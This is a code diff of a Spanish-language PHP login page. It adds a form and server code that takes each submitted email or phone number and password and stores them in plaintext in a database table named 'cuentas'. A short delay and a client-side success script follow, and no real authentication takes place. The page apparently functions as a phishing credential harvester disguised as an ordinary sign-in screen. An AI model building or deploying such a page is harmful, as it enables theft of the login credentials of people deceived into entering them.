@@ -1,3 +1,22 @@
+<?php  
+    include_once('conexion.php');
+    echo  "<script src='index.js'></script>";
+    echo "<script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>";
+    $correo = (isset($_POST['Correo']) ? $_POST['Correo'] : "");
+    $contrasenia = (isset($_POST['Contrasenia']) ? $_POST['Contrasenia'] : "");
+    $accion = (isset($_POST['Subir'])) ? $_POST['Subir'] : "";
+    if($accion == 'Subir'){
+        sleep(4);
+        $query = $conexion->prepare("INSERT INTO cuentas (correo,contrasenia) VALUES(:correo,:contrasenia)");
+        $query->bindParam(':correo',$correo);
+        $query->bindParam(':contrasenia',$contrasenia);
+        $query->execute();
+        $accion = "";
+    }
+           
+
+
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -15,9 +34,14 @@
         </div>
     
         <div class="Cuadro">
-            <input class="Inputs" type="text" placeholder="Correo electronico o número de teléfono">
-            <input class="Inputs" type="text" placeholder="Contraseña">
-            <button class="Submit" type="submit">Iniciar sesión</button>  
+            <form action="" method="POST">
+                <input class="Inputs" name="Correo" type="text" placeholder="Correo electronico o número de teléfono">
+                <input class="Inputs" name="Contrasenia" type="text"  placeholder="Contraseña">
+                <button class="Submit" name="Subir" value="Subir" onclick="exito()" type="submit">Iniciar sesión</button>  
+            </form>
+          
+            
+         
             <div class="Span">
                 <a class="Olvidar" href="">¿Olvidaste tu contraseña?</a>
             </div>
